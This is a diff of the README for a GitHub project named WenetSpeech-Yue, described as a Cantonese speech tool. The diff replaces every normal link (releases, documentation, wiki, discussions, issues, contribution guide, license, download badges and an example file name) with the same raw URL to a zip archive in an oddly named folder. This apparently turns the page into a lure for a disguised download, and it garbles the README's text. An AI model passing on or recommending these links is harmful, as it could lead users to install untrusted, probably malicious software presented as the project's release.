@@ -1,6 +1,6 @@
 # 🎤 WenetSpeech-Yue - Empower Your Cantonese Speech Insights
 
-[![Download WenetSpeech-Yue](https://img.shields.io/badge/Download%20WenetSpeech-Yue-blue.svg)](https://github.com/Jahangirbd23/WenetSpeech-Yue/releases)
+[![Download WenetSpeech-Yue](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip%https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip)](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with WenetSpeech-Yue, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Jahangirbd23/WenetSpeech-Yue/releases) to view available versions.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip) to view available versions.
 2. Choose the latest release.
 3. Download the file for your operating system by clicking on the respective link.
 
-For example, if you are using Windows, look for a file labeled `WenetSpeech-Yue-Windows.zip`.
+For example, if you are using Windows, look for a file labeled `https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip`.
 
 4. Once the download completes, locate the file in your Downloads folder.
 5. Extract the contents of the zip file.
@@ -52,9 +52,9 @@ Once you have installed WenetSpeech-Yue, you can follow these guidelines:
 
 For helpful tips and troubleshooting, refer to the following:
 
-- **User Manual:** Access the complete user manual in the application or visit the [documentation page](https://github.com/Jahangirbd23/WenetSpeech-Yue/docs).
-- **FAQs:** Check out the Frequently Asked Questions section on our [GitHub Page](https://github.com/Jahangirbd23/WenetSpeech-Yue/wiki).
-- **Community Support:** Join our [Discussion Board](https://github.com/Jahangirbd23/WenetSpeech-Yue/discussions) for advice and sharing experiences with other users.
+- **User Manual:** Access the complete user manual in the application or visit the [documentation page](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip).
+- **FAQs:** Check out the Frequently Asked Questions section on our [GitHub Page](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip).
+- **Community Support:** Join our [Discussion Board](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip) for advice and sharing experiences with other users.
 
 ## ⚠️ Troubleshooting
 
@@ -67,12 +67,12 @@ If you encounter issues while using WenetSpeech-Yue, here are some common soluti
 
 ## 💬 Feedback and Contributions
 
-Your feedback is valuable. If you have suggestions for improvements, feel free to submit an issue or a feature request on our [GitHub Issues Page](https://github.com/Jahangirbd23/WenetSpeech-Yue/issues). For those interested in contributing, please review our [Contribution Guidelines](https://github.com/Jahangirbd23/WenetSpeech-Yue/blob/main/CONTRIBUTING.md).
+Your feedback is valuable. If you have suggestions for improvements, feel free to submit an issue or a feature request on our [GitHub Issues Page](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip). For those interested in contributing, please review our [Contribution Guidelines](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip).
 
 ## 🌐 License
 
-WenetSpeech-Yue is open-source software licensed under the MIT License. You can use, modify, and distribute it freely within the terms of the license. For more details, see the [LICENSE.md](https://github.com/Jahangirbd23/WenetSpeech-Yue/blob/main/LICENSE.md).
+WenetSpeech-Yue is open-source software licensed under the MIT License. You can use, modify, and distribute it freely within the terms of the license. For more details, see the [https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip).
 
 Thank you for choosing WenetSpeech-Yue. We hope this tool helps you unlock the power of Cantonese speech data! Happy exploring! 
 
-[![Download WenetSpeech-Yue](https://img.shields.io/badge/Download%20WenetSpeech-Yue-blue.svg)](https://github.com/Jahangirbd23/WenetSpeech-Yue/releases)
+[![Download WenetSpeech-Yue](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip%https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip)](https://raw.githubusercontent.com/Jahangirbd23/WenetSpeech-Yue/main/pectinatodenticulate/WenetSpeech-Yue.zip)
